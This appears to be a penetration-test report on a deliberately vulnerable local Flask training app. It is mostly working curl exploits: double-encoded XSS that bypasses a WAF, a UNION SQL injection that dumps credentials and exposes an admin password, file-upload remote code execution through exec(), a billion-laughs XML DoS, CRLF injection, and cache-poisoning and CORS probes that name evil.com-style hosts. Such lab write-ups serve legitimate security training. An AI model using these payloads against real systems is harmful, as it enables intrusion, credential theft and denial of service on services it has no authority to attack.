# Tegh Industries - Comprehensive Vulnerability Assessment Report

**Target Status**: Operational (Development Environment)
**Target URL**: `http://127.0.0.1:5000`
**Defense Grid**: Integrated WAF (Cloudflare Simulation)
**Platform**: Flask / SQLite3 / Python 3.x

---

## 1. Cross-Site Scripting (XSS)

### A. Reflected XSS (WAF Bypass via Double Encoding)
**Vulnerability**: The search system reflects query parameters into the HTML results. A WAF blocks standard tags, but a double-decoding flaw in the backend allows bypass.

*   **Endpoint**: `/search?q=`
*   **Bypass Logic**: The WAF unquotes once. The backend unquotes again. Double-encoding (e.g., `<` -> `%253C`) hides the payload from the WAF but reveals it to the template.
*   **Proof of Concept (Curl)**:
    ```bash
    # Payload: <img src=x onerror=confirm(1)>
    # Double-Encoded: %253Cimg%2520src%253Dx%2520onerror%253Dconfirm(1)%253E
    curl -s "http://127.0.0.1:5000/search?q=%253Cimg%2520src%253Dx%2520onerror%253Dconfirm(1)%253E" | grep "confirm(1)"
    ```

### B. Stored XSS (Field Notes / Contact Preview)
**Vulnerability**: The contact/notes form allows "Verified Entry" (preview) which renders raw HTML. It attempts to strip `<script>` but fails on event handlers.

# Double-encoded payload:
# %253Cimg%2520src%253Dx%2520onerror%253Dalert('StoredXSS')%253E

curl -X POST \
 -F "message=%253Cimg%2520src%253Dx%2520onerror%253Dalert('StoredXSS')%253E" \
 -F "preview=true" \
 http://127.0.0.1:5000/contact


*   **Endpoint**: `/contact` (POST)
*   **Attack Vector**:
    ```bash
    curl -X POST -F "message=<img src=x onerror=alert('StoredXSS')>" -F "preview=true" http://127.0.0.1:5000/contact
    ```
*   **Result**: The server returns a page with the unescaped image tag, executing the script.

---

## 2. SQL Injection (SQLi)

### A. Manual Data Extraction (UNION Based)
**Vulnerability**: The search parameter is concatenated directly into the SQL string.

curl -s "http://127.0.0.1:5000/api/search?q=%2527%2520UNION%2520SELECT%25201%252Cusername%252Cpassword%252Crole%252C5%252C6%252C7%252C8%252C9%2520FROM%2520users--"


*   **Endpoint**: `/api/search?q=`
*   **Extraction Payload**: `' UNION SELECT 1,username,password,role,5,6,7,8,9 FROM users--`
*   **Proof of Concept (Curl)**:
    ```bash
    curl -s "http://127.0.0.1:5000/api/search?q=%27%20UNION%20SELECT%201,username,password,role,5,6,7,8,9%20FROM%20users--" 
    ```
*   **Result**: Returns the admin credentials (`admin:industrial_titan_99`) inside the campaign results JSON.

---

## 3. Remote Code Execution (RCE)

### A. Insecure File Upload (Script Execution)
**Vulnerability**: The "System Update Uplink" auto-executes uploaded `.py` files using `exec()`.

*   **Endpoint**: `/upload` (POST)
*   **Exploit Code (`pwn.py`)**:
    ```python
    import os
    os.system("echo 'RCE SUCCESSFULL' > /tmp/pwned.txt")
    print("Remote Code Executed")
    ```
*   **Proof of Concept (Curl)**:
    ```bash
    echo "import os; print('Hacked'); os.system('whoami')" > exploit.py
    curl -F "file=@exploit.py" http://127.0.0.1:5000/upload
    ```
*   **Impact**: Full system take-over.

---

## 4. XML External Entity (XXE) / XML DoS

### A. Billion Laughs Attack (DoS)
**Vulnerability**: The report processing module uses an insecure XML parser.

*   **Endpoint**: `/api/process_report` (POST)
*   **Proof of Concept (Curl)**:
    ```bash
    curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">]> <report><content>&lol2;</content></report>' http://127.0.0.1:5000/api/process_report
    ```

---

## 5. Insecure Direct Object Reference (IDOR)

### A. Accessing Hidden/Private Campaigns
**Vulnerability**: Object references are predictable and lack permission checks.

*   **Public Access**: `/campaign/1`
*   **Unauthorized Access (Hidden Ops)**: `/campaign/4` (Black Operations IV)
*   **Proof of Concept (Curl)**:
    ```bash
    curl -s http://127.0.0.1:5000/campaign/4 | grep "Black Operations"
    ```

### B. Personnel Data Leak
*   **Endpoint**: `/personnel`
*   **Vulnerability**: Lists all staff, assignment, and clearances without authentication.

---

## 6. Information Disclosure

*   **Git Repository Metadata**: `curl http://127.0.0.1:5000/.git/` (Exposes repo structure).
*   **Backup Database**: `curl http://127.0.0.1:5000/backups/db_backup.sql` (Exposes potential DB dumps).
*   **Robots Policy**: `curl http://127.0.0.1:5000/robots.txt` (Leaks hidden `/api/` and `/.git/` paths).

---

## 7. Configuration Flaws

### A. CRLF Injection
*   **Endpoint**: `/api/track?source=`
*   **Attack**: Injecting `\r\n` to manipulate HTTP response headers.
*   **Proof**: `curl -i "http://127.0.0.1:5000/api/track?source=%0d%0aSet-Cookie:%20PHPSESSID=PWNED"`

### B. Cache Poisoning
*   **Detection**: Reflection of `X-Forwarded-Host` in JS.
*   **Proof**: `curl -H "X-Forwarded-Host: evil.com" http://127.0.0.1:5000/assets/analytics.js`

### C. CORS Misconfiguration
*   **Detection**: Reflection of any `Origin` header.
*   **Proof**: `curl -i -H "Origin: evil-attacker.com" http://127.0.0.1:5000/api/search`

---

## 8. Open Redirect

*   **Endpoint**: `/redirect?url=`
*   **Proof**: `curl -i "http://127.0.0.1:5000/redirect?url=https://bing.com"`
